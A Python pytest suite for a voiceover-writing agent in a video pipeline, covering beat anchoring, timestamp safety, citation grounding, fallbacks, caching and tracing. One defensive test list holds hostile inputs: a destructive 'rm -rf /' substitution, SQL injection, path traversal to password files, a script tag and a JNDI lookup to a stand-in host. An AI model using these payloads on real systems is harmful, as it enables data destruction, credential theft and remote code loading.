"""
Voiceover Agent.

The LLM is injected throughout - no test needs a key or a network. The
properties most of these defend:

  * a line can only sit on a beat the Story already anchored; the clip comes
    from that beat, never from the reply, so invented footage is impossible
  * a line cannot express a time, even if the model sends one
  * narration follows the story's beat order
  * with no model, NO words are invented - only the shape of a script
"""

import json

import pytest
from pydantic import ValidationError

from agents.artifacts import (ClipPriority, ContentStrategy, EvidenceItem,
                              Hook, KeyPoint, NarrationSegment,
                              ResearchReport, Story, StoryBeat, TrendItem,
                              Voiceover)
from agents.tools.llm_tools import LLMClient, LLMReply
from agents.voiceover import VoiceoverAgent

CALM, LIVELY = "01_calm.mp4", "02_lively.mp4"
URL_A = "https://example.test/a"
URL_B = "https://example.test/b"
GHOST = "https://example.test/never-retrieved"


# ------------------------------------------------------------- helpers

def vo_llm(payload, record=None):
    def transport(prompt, max_tokens, images=None):
        if record is not None:
            record.append(prompt)
        text = payload if isinstance(payload, str) else json.dumps(payload)
        return LLMReply(text=text, tokens_in=700, tokens_out=500, usd=0.007)
    return LLMClient(transport=transport)


def failing_llm(error="ConnectionError: refused"):
    def transport(prompt, max_tokens, images=None):
        return LLMReply(text="", error=error)
    return LLMClient(transport=transport)


def a_story(live=True, beats=True):
    bs = [
        StoryBeat(index=1, role="hook", clip_id=LIVELY, moment_ref=1,
                  narrative="it is already moving", why="motion reads"),
        StoryBeat(index=2, role="develop", clip_id=CALM, moment_ref=0,
                  narrative="how the gears mesh", why="explains it"),
        StoryBeat(index=3, role="ending", clip_id=LIVELY,
                  narrative="one last turn", why="closes on the payoff"),
    ] if beats else []
    return Story(domain="model engineering", story_type="reasoned",
                 logline="a gear train built and then run",
                 hook="the mechanism already moving", setup="what the parts are",
                 progression="from parts to motion", payoff="it turns",
                 ending="a last look", beats=bs,
                 strategy_available=True, vision_available=True,
                 insufficient_signal=False, confidence=0.8, live=live)


def a_strategy(insufficient=False):
    return ContentStrategy(
        domain="model engineering", strategy_type="reasoned",
        central_topic="a working gear train", core_angle="simpler than it looks",
        audience="people who build mechanisms", objective="make them build one",
        hook=Hook(clip_id=LIVELY), pacing="fast",
        engagement_strategy="lead with the payoff",
        key_points=[KeyPoint(point="it actually turns", support="vision",
                             clip_ids=[LIVELY])],
        clip_priorities=[ClipPriority(clip_id=LIVELY, priority=1)],
        vision_available=True, research_available=True,
        insufficient_signal=insufficient, confidence=0.8, live=True)


def a_research(evidence=True, insufficient=False):
    ev = [EvidenceItem(title="Piece A", url=URL_A, snippet="s", source="fake",
                       query="q", retrieved_at=1.0, published_at="2026-09-01"),
          EvidenceItem(title="Piece B", url=URL_B, snippet="s", source="fake",
                       query="q", retrieved_at=1.0,
                       published_at="2026-09-02")] if evidence else []
    return ResearchReport(
        domain="model engineering", provider="fake", live=True, evidence=ev,
        trends=[TrendItem(label="mechanisms", observation="popular",
                          evidence_urls=[URL_A], confidence=0.8)]
               if evidence else [],
        insufficient_signal=insufficient or not evidence, confidence=0.7)


GOOD = {
    "voice": "warm",
    "voice_rationale": "it is a patient build",
    "audience": "people who build mechanisms",
    "segments": [
        {"beat_index": 1, "text": "This little gear train runs on nothing "
                                  "but stored tension.",
         "tone": "energetic", "note": "open bright"},
        {"beat_index": 2, "text": "Every tooth has to meet its partner "
                                  "exactly once per turn.",
         "tone": "calm", "evidence_urls": [URL_A]},
        {"beat_index": 3, "text": "And then it simply goes.", "tone": "warm",
         "note": "let it land"},
    ],
    "delivery_notes": ["unhurried throughout"],
    "risks": ["could sound like a lecture"],
    "limitations": ["only three beats"],
    "confidence": 0.8,
}


def run(ctx, tracer_span, story=None, strategy=None, research=None,
        revision=0):
    agent = VoiceoverAgent()
    with tracer_span(ctx, "voiceover") as span:
        return agent.execute(ctx, span, story=story, strategy=strategy,
                             research=research, revision=revision)


@pytest.fixture
def vo_ctx(director_ctx):
    ctx, _clip_set = director_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(
            update={"domain": "model engineering"})})
    return ctx


# ------------------------------------------------ 1. a valid script

def test_a_valid_reply_becomes_a_complete_script(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    art = run(ctx, tracer_span, a_story(), a_strategy(), a_research())
    p = art.payload

    assert isinstance(p, Voiceover)
    assert p.voiceover_type == "reasoned"
    assert p.voice == "warm"
    assert p.voice_rationale == "it is a patient build"
    assert p.audience == "people who build mechanisms"
    assert len(p.segments) == 3
    assert p.delivery_notes == ["unhurried throughout"]
    assert p.live is True
    assert not p.insufficient_signal
    assert art.degraded is False and art.fallback_used is None


def test_the_envelope_is_complete(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    art = run(ctx, tracer_span, a_story(), a_strategy(), a_research())
    assert art.artifact_id and art.job_id == ctx.job.job_id
    assert art.kind == "Voiceover"
    assert art.schema_version >= 1 and art.revision == 0
    assert art.produced_by == "voiceover"
    assert art.produced_at > 0 and art.inputs_hash and art.trace_id
    assert 0.0 <= art.confidence <= 1.0
    assert art.cost is not None


def test_word_counts_are_computed_not_declared(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert p.segments[0].word_count == 10
    assert p.total_words == sum(s.word_count for s in p.segments)
    assert p.script.count("\n") == 2       # three lines


# ------------------------------- 2. upstreams consumed properly

def test_story_strategy_and_research_all_reach_the_prompt(vo_ctx,
                                                          tracer_span):
    ctx = vo_ctx
    seen = []
    ctx.llm = vo_llm(GOOD, record=seen)
    run(ctx, tracer_span, a_story(), a_strategy(), a_research())
    prompt = seen[0]

    assert "THE STORY" in prompt
    assert "a gear train built and then run" in prompt
    assert "[1] hook" in prompt and "[2] develop" in prompt
    assert "reference these by index" in prompt
    assert "THE BRIEF" in prompt
    assert "people who build mechanisms" in prompt
    assert "OUTSIDE EVIDENCE" in prompt and URL_A in prompt
    # the model is told NOT to name a clip. Matched without the leading
    # "do", which the prompt wraps onto the previous line.
    assert "NOT name a clip" in prompt
    # and no raw JSON dump of any upstream
    assert '"insufficient_signal"' not in prompt


def test_provenance_is_recorded(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    p = run(ctx, tracer_span, a_story(), a_strategy(), a_research()).payload
    assert p.story_available and p.strategy_available and p.research_available
    assert URL_A in p.research_basis
    assert p.beats_covered == [1, 2, 3]


# ----------------------- 3. beat anchoring: the structural rule

def test_the_clip_comes_from_the_beat_not_the_reply(vo_ctx, tracer_span):
    """The model cannot put narration on footage the story never anchored."""
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 1, "text": "words", "clip_id": "99_invented.mp4"}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    # beat 1 is LIVELY; the reply's clip_id is ignored entirely
    assert p.segments[0].clip_id == LIVELY


def test_the_moment_ref_comes_from_the_beat_too(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 1, "text": "words", "moment_ref": 7}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert p.segments[0].moment_ref == 1      # beat 1's own moment_ref


@pytest.mark.parametrize("bi", [99, 0, -1, "1", 1.5, True, None, {"a": 1}])
def test_a_line_on_a_nonexistent_beat_is_dropped(vo_ctx, tracer_span, bi):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": bi, "text": "unanchored"},
        {"beat_index": 2, "text": "kept"}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert [s.beat_index for s in p.segments] == [2]
    assert any("does not exist" in x for x in p.limitations)


def test_a_line_with_no_words_is_dropped(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 1, "text": "   "},
        {"beat_index": 2, "text": "kept"}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert [s.beat_index for s in p.segments] == [2]
    assert any("carried no words" in x for x in p.limitations)


def test_several_lines_may_share_one_beat(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 1, "text": "first half"},
        {"beat_index": 1, "text": "second half"}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert [s.beat_index for s in p.segments] == [1, 1]
    assert [s.text for s in p.segments] == ["first half", "second half"]


def test_a_beat_may_carry_no_narration_at_all(vo_ctx, tracer_span):
    """Silence is allowed; it is not an error."""
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 2, "text": "only the middle speaks"}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert p.beats_covered == [2]
    assert not p.insufficient_signal


# --------------------------------------------------- 4. ordering

def test_lines_are_reordered_to_follow_the_story(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 3, "text": "last"},
        {"beat_index": 1, "text": "first"},
        {"beat_index": 2, "text": "middle"}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert [s.beat_index for s in p.segments] == [1, 2, 3]
    assert [s.text for s in p.segments] == ["first", "middle", "last"]
    assert any("reordered" in x for x in p.limitations)


def test_order_within_a_beat_is_the_models_own(vo_ctx, tracer_span):
    """A stable sort: lines sharing a beat keep the order they were given."""
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 2, "text": "B second"},
        {"beat_index": 1, "text": "A first"},
        {"beat_index": 2, "text": "B third"}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert [s.text for s in p.segments] == ["A first", "B second", "B third"]


def test_segment_indices_are_contiguous_after_drops(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 99, "text": "dropped"},
        {"beat_index": 1, "text": "a"},
        {"beat_index": 77, "text": "dropped too"},
        {"beat_index": 3, "text": "b"}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert [s.index for s in p.segments] == [1, 2]


def test_the_model_rejects_non_contiguous_indices():
    with pytest.raises(ValidationError):
        Voiceover(segments=[
            NarrationSegment(index=1, beat_index=1, clip_id="a", text="x"),
            NarrationSegment(index=3, beat_index=2, clip_id="b", text="y")])


# ------------------------------------------- 5. timestamp safety

def test_the_schema_makes_a_timestamp_structurally_impossible():
    for bad in ({"start": 1.0}, {"end": 2.0}, {"duration": 3.0},
                {"at": 4.0}, {"seconds": 5}, {"word_count": 99},
                {"offset": 1}):
        with pytest.raises(ValidationError):
            NarrationSegment(index=1, beat_index=1, clip_id="a", **bad)
    for bad in ({"total_duration": 30.0}, {"runtime": 12}):
        with pytest.raises(ValidationError):
            Voiceover(**bad)


def test_no_field_can_hold_a_time():
    banned = {"start", "end", "duration", "at", "in_point", "out_point",
              "timestamp", "offset", "seconds", "t", "total_duration",
              "runtime", "length"}
    for model in (Voiceover, NarrationSegment):
        assert not (set(model.model_fields) & banned), model.__name__


def test_a_model_sending_timings_is_ignored_not_obeyed(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 1, "text": "words", "start": 10.5, "end": 20.0,
         "duration": 9.5, "seconds": 3}]})
    art = run(ctx, tracer_span, a_story(), a_strategy())
    dumped = json.dumps(art.payload.model_dump())
    assert "10.5" not in dumped
    assert '"start"' not in dumped and '"duration"' not in dumped
    assert len(art.payload.segments) == 1


def test_word_count_is_a_property_not_an_injectable_field():
    seg = NarrationSegment(index=1, beat_index=1, clip_id="a",
                           text="one two three")
    assert seg.word_count == 3
    assert "word_count" not in NarrationSegment.model_fields


# ------------------------------------------ 6. research grounding

def test_a_citation_that_was_never_retrieved_is_stripped(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 1, "text": "these get 3x the views",
         "evidence_urls": [GHOST]}]})
    p = run(ctx, tracer_span, a_story(), a_strategy(), a_research()).payload
    assert p.segments[0].evidence_urls == []
    assert p.segments[0].support == "vision"
    assert GHOST not in p.research_basis
    assert any("never retrieved" in x for x in p.limitations)


def test_a_real_citation_is_kept_and_upgrades_support(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 1, "text": "grounded", "evidence_urls": [URL_A]}]})
    p = run(ctx, tracer_span, a_story(), a_strategy(), a_research()).payload
    assert p.segments[0].evidence_urls == [URL_A]
    assert p.segments[0].support == "both"


def test_a_citation_with_no_research_cannot_ground_a_line(vo_ctx,
                                                          tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 1, "text": "x", "evidence_urls": [URL_A]}]})
    p = run(ctx, tracer_span, a_story(), a_strategy(), None).payload
    assert p.segments[0].evidence_urls == []
    assert p.research_basis == []


# ------------------------------------ 7. malformed / invalid output

@pytest.mark.parametrize("junk", ["not json", "", "[1,2,3]", '{"voice": '])
def test_malformed_replies_fall_back(vo_ctx, tracer_span, junk):
    ctx = vo_ctx
    ctx.llm = vo_llm(junk)
    art = run(ctx, tracer_span, a_story(), a_strategy())
    assert art.degraded is True
    assert art.fallback_used and "no narration written" in art.fallback_used
    assert isinstance(art.payload, Voiceover)


def test_a_failed_call_falls_back(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = failing_llm()
    art = run(ctx, tracer_span, a_story(), a_strategy())
    assert art.degraded is True and art.payload.live is False


def test_junk_types_are_survived(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({"voice": 7, "voice_rationale": ["x"], "audience": True,
                      "segments": "not a list", "delivery_notes": {"a": 1},
                      "risks": None, "limitations": 5, "confidence": "high"})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert p.voice == "neutral"
    assert p.voice_rationale == ""
    assert p.audience == "", "a bool must not become text"
    assert p.segments == [] and p.delivery_notes == []
    assert p.confidence == 0.0


@pytest.mark.parametrize("bad", ["shouty", "WARM", "", None, 7])
def test_an_invalid_tone_falls_back_to_neutral(vo_ctx, tracer_span, bad):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "voice": bad, "segments": [
        {"beat_index": 1, "text": "x", "tone": bad}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert p.voice == "neutral"
    assert p.segments[0].tone == "neutral"


@pytest.mark.parametrize("bad", [5.0, -3, float("nan"), float("inf"), "x",
                                 None])
def test_confidence_is_always_in_range(vo_ctx, tracer_span, bad):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "confidence": bad})
    art = run(ctx, tracer_span, a_story(), a_strategy())
    assert 0.0 <= art.payload.confidence <= 1.0
    assert 0.0 <= art.confidence <= 1.0


def test_segment_count_and_text_length_are_bounded(vo_ctx, tracer_span):
    ctx = vo_ctx
    huge = "word " * 5000
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 1, "text": huge}] * 200})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert len(p.segments) <= 12
    assert all(len(s.text) <= 400 for s in p.segments)


# ------------------------------------------- 8. malicious strings

MALICIOUS = [
    "$(rm -rf /)", "; DROP TABLE artifacts; --", "../../../../etc/passwd",
    "C:\\Windows\\System32\\cmd.exe", "crop=in_w:in_h:0:0,scale=-1:720",
    "' OR '1'='1", "<script>alert(1)</script>", "file:///etc/shadow",
    "\x00truncated", "${jndi:ldap://evil.test/x}",
]


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_string_stays_inert_data(vo_ctx, tracer_span, payload):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "audience": payload, "segments": [
        {"beat_index": 1, "text": payload, "note": payload}]})
    p = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert isinstance(p.segments[0].text, str)
    again = Voiceover.model_validate_json(p.model_dump_json())
    assert isinstance(again.segments[0].text, str)
    # the clip still came from the beat, never from the payload
    assert again.segments[0].clip_id == LIVELY


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_url_is_not_accepted_as_evidence(vo_ctx, tracer_span,
                                                     payload):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [
        {"beat_index": 1, "text": "x", "evidence_urls": [payload]}]})
    p = run(ctx, tracer_span, a_story(), a_strategy(), a_research()).payload
    assert p.segments[0].evidence_urls == []
    assert payload not in p.research_basis


# --------------------------------------- 9. fallback with no key

def test_with_no_api_key_no_words_are_invented(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = LLMClient()
    assert not ctx.llm.available()

    art = run(ctx, tracer_span, a_story(), a_strategy(), a_research())
    p = art.payload

    assert art.degraded is True
    assert art.fallback_used and "no narration written" in art.fallback_used
    assert p.live is False and p.model is None
    assert p.voiceover_type == "degraded"
    assert p.segments, "the shape of the script must still be there"
    assert all(s.text == "" for s in p.segments), "no word may be invented"
    assert p.spoken_segments == []
    assert p.total_words == 0
    assert p.script == ""
    assert p.confidence == 0.0
    assert p.insufficient_signal is True
    assert any("no narration was written" in x for x in p.limitations)


def test_the_fallback_placeholders_track_the_beats(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = LLMClient()
    story = a_story()
    p = run(ctx, tracer_span, story, a_strategy()).payload
    assert [s.beat_index for s in p.segments] == [1, 2, 3]
    assert [s.clip_id for s in p.segments] == [b.clip_id for b in story.beats]
    assert [s.moment_ref for s in p.segments] == [b.moment_ref
                                                  for b in story.beats]
    assert p.beats_covered == [], "nothing is covered when nothing is spoken"


def test_no_story_produces_a_minimal_script_and_never_raises(vo_ctx,
                                                             tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    art = run(ctx, tracer_span, None, a_strategy())
    assert art.payload.voiceover_type == "minimal"
    assert art.payload.segments == []
    assert art.payload.story_available is False
    assert any("no story with beats" in x for x in art.payload.limitations)


def test_a_story_with_no_beats_is_not_narratable(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    art = run(ctx, tracer_span, a_story(beats=False), a_strategy())
    assert art.payload.story_available is False
    assert art.payload.segments == []


def test_no_story_never_calls_the_model(vo_ctx, tracer_span):
    """There is nothing to narrate, so spending a call would be waste."""
    calls = []
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD, record=calls)
    run(ctx, tracer_span, None, a_strategy())
    assert calls == []


def test_a_deterministic_story_caps_confidence(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "confidence": 1.0})
    p = run(ctx, tracer_span, a_story(live=False), a_strategy(),
            a_research()).payload
    assert p.confidence <= 0.5
    assert any("assembled deterministically" in x for x in p.limitations)


# ---------------------------------------------- 10. cache behaviour

def test_identical_inputs_hit_the_cache(vo_ctx, tracer_span):
    ctx = vo_ctx
    calls = []
    ctx.llm = vo_llm(GOOD, record=calls)
    st, cs, r = a_story(), a_strategy(), a_research()
    first = run(ctx, tracer_span, st, cs, r, revision=0)
    second = run(ctx, tracer_span, st, cs, r, revision=1)
    assert second.artifact_id == first.artifact_id
    assert second.revision == 0
    assert len(calls) == 1


def test_the_cache_invalidates_when_the_story_changes(vo_ctx, tracer_span):
    ctx = vo_ctx
    calls = []
    ctx.llm = vo_llm(GOOD, record=calls)
    cs, r = a_strategy(), a_research()
    first = run(ctx, tracer_span, a_story(), cs, r, revision=0)

    changed = a_story()
    changed = changed.model_copy(update={"logline": "a different story"})
    second = run(ctx, tracer_span, changed, cs, r, revision=1)
    assert second.inputs_hash != first.inputs_hash
    assert len(calls) == 2


def test_the_cache_invalidates_when_a_beat_changes(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    cs = a_strategy()
    first = run(ctx, tracer_span, a_story(), cs, revision=0)

    changed = a_story()
    changed = changed.model_copy(update={"beats": [
        b.model_copy(update={"narrative": "rewritten"}) for b in changed.beats]})
    second = run(ctx, tracer_span, changed, cs, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_invalidates_when_the_strategy_changes(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    st = a_story()
    first = run(ctx, tracer_span, st, a_strategy(), revision=0)
    changed = a_strategy().model_copy(update={"audience": "someone else"})
    second = run(ctx, tracer_span, st, changed, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_invalidates_when_research_changes(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    st, cs = a_story(), a_strategy()
    first = run(ctx, tracer_span, st, cs, a_research(), revision=0)
    changed = a_research().model_copy(update={"evidence": []})
    second = run(ctx, tracer_span, st, cs, changed, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_is_not_time_based(vo_ctx, tracer_span):
    import time as _t
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    agent = VoiceoverAgent()
    st, cs, r = a_story(), a_strategy(), a_research()
    with tracer_span(ctx, "voiceover") as span:
        a = agent.execute(ctx, span, story=st, strategy=cs, research=r,
                          revision=0)
    _t.sleep(1.1)
    with tracer_span(ctx, "voiceover") as span:
        b = agent.execute(ctx, span, story=st, strategy=cs, research=r,
                          revision=1)
    assert a.inputs_hash == b.inputs_hash


# ------------------------------------- 11. trace + decisions

def test_the_trace_id_reaches_the_artifact(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    agent = VoiceoverAgent()
    with tracer_span(ctx, "voiceover") as span:
        art = agent.execute(ctx, span, story=a_story(), strategy=a_strategy())
        assert art.trace_id == span.trace_id
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "voiceover"]
    assert rows and art.artifact_id in rows[-1]["output_artifacts"]


def test_the_llm_call_is_recorded_in_the_trace(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    run(ctx, tracer_span, a_story(), a_strategy())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "voiceover"]
    tools = [t["tool"] for r in rows for t in r["tool_calls"]]
    assert "llm.complete_json" in tools
    assert rows[-1]["tokens_in"] == 700 and rows[-1]["tokens_out"] == 500


def test_the_fallback_is_recorded_in_the_trace(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = LLMClient()
    run(ctx, tracer_span, a_story(), a_strategy())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "voiceover"]
    assert rows[-1]["fallback_used"]


def test_a_dropped_line_is_noted_in_the_trace(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm({**GOOD, "segments": [{"beat_index": 99, "text": "x"}]})
    run(ctx, tracer_span, a_story(), a_strategy())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "voiceover"]
    notes = " ".join(n for r in rows for n in r["notes"])
    assert "does not exist" in notes


def test_decisions_use_the_existing_closed_enum(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    art = run(ctx, tracer_span, a_story(), a_strategy(), a_research())
    assert art.decisions
    allowed = {"llm", "measurement", "policy", "human", "fallback"}
    for d in art.decisions:
        assert d.what and d.chose and d.why
        assert d.decided_by in allowed, "the closed enum must not be widened"
        assert 0.0 <= d.confidence <= 1.0
    whats = {d.what for d in art.decisions}
    assert "Evidence the narration was written from" in whats
    assert "Narration written" in whats
    assert "Narration order" in whats


def test_the_evidence_decision_names_all_three_sources(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = vo_llm(GOOD)
    art = run(ctx, tracer_span, a_story(), a_strategy(), a_research())
    d = next(d for d in art.decisions
             if d.what == "Evidence the narration was written from")
    assert d.chose == "Story + ContentStrategy + Research"


def test_the_fallback_attributes_nothing_to_an_llm(vo_ctx, tracer_span):
    ctx = vo_ctx
    ctx.llm = LLMClient()
    art = run(ctx, tracer_span, a_story(), a_strategy())
    kinds = {d.decided_by for d in art.decisions}
    assert "fallback" in kinds
    assert "llm" not in kinds


# ------------------------- 12. the narration reaches the edit

def test_the_director_receives_the_narration(vo_ctx, tracer_span,
                                             director_ctx):
    from agents.editing_director import EditingDirectorAgent

    ctx = vo_ctx
    _c, clip_set = director_ctx
    ctx.llm = vo_llm(GOOD)
    vo = run(ctx, tracer_span, a_story(), a_strategy(), a_research()).payload

    seen = []
    ctx.llm = vo_llm({"strategy": "s", "opening_rationale": "r",
                      "segments": [{"clip_id": LIVELY, "target_seconds": 4.0,
                                    "reason": "x"}],
                      "rejected": []}, record=seen)
    with tracer_span(ctx, "editing_director") as span:
        EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                       voiceover=vo, revision=0)

    prompt = seen[0]
    assert "THE NARRATION" in prompt
    assert "voice: warm" in prompt
    assert "stored tension" in prompt
    assert "NOT durations" in prompt
    assert "You do NOT choose timestamps" in prompt


def test_a_changed_script_invalidates_the_edit_plan_cache(vo_ctx, tracer_span,
                                                          director_ctx):
    from agents.editing_director import EditingDirectorAgent

    ctx = vo_ctx
    _c, clip_set = director_ctx
    ctx.llm = LLMClient()
    agent = EditingDirectorAgent()
    one = Voiceover(segments=[NarrationSegment(index=1, beat_index=1,
                                               clip_id=LIVELY, text="one")])
    two = Voiceover(segments=[NarrationSegment(index=1, beat_index=1,
                                               clip_id=LIVELY,
                                               text="something else")])
    with tracer_span(ctx, "editing_director") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, voiceover=one,
                          revision=0)
    with tracer_span(ctx, "editing_director") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, voiceover=two,
                          revision=1)
    assert a.inputs_hash != b.inputs_hash


def test_the_director_records_that_it_acted_on_narration(vo_ctx, tracer_span,
                                                         director_ctx):
    from agents.editing_director import EditingDirectorAgent

    ctx = vo_ctx
    _c, clip_set = director_ctx
    ctx.llm = LLMClient()
    vo = Voiceover(live=True, confidence=0.8, beats_covered=[1],
                   segments=[NarrationSegment(index=1, beat_index=1,
                                              clip_id=LIVELY,
                                              text="a spoken line")])
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             voiceover=vo, revision=0)
    d = next(d for d in art.decisions
             if d.what == "Narration from the Voiceover agent")
    assert "1 line(s)" in d.chose
    assert d.decided_by == "policy"


def test_the_director_works_with_no_narration(vo_ctx, tracer_span,
                                              director_ctx):
    from agents.editing_director import EditingDirectorAgent

    ctx = vo_ctx
    _c, clip_set = director_ctx
    ctx.llm = LLMClient()
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             voiceover=None, revision=0)
    assert art.payload.segments
    assert not any(d.what == "Narration from the Voiceover agent"
                   for d in art.decisions)


def test_a_placeholder_only_script_does_not_reach_the_prompt(vo_ctx,
                                                             tracer_span,
                                                             director_ctx):
    """Empty placeholders are not narration; the director is not told there
    are lines when there are none."""
    from agents.editing_director import EditingDirectorAgent

    ctx = vo_ctx
    _c, clip_set = director_ctx
    ctx.llm = LLMClient()
    vo = run(ctx, tracer_span, a_story(), a_strategy()).payload
    assert vo.spoken_segments == []

    seen = []
    ctx.llm = vo_llm({"strategy": "s", "opening_rationale": "r",
                      "segments": [{"clip_id": LIVELY, "target_seconds": 4.0,
                                    "reason": "x"}],
                      "rejected": []}, record=seen)
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             voiceover=vo, revision=0)
    assert "THE NARRATION" not in seen[0]
    assert not any(d.what == "Narration from the Voiceover agent"
                   for d in art.decisions)


# ------------------------------------------ helpers on the model

def test_for_beat_and_spoken_helpers():
    v = Voiceover(segments=[
        NarrationSegment(index=1, beat_index=1, clip_id="a", text="one"),
        NarrationSegment(index=2, beat_index=1, clip_id="a", text="two"),
        NarrationSegment(index=3, beat_index=2, clip_id="b", text="")])
    assert [s.text for s in v.for_beat(1)] == ["one", "two"]
    assert v.for_beat(9) == []
    assert len(v.spoken_segments) == 2
    assert v.total_words == 2
    assert v.script == "one\ntwo"
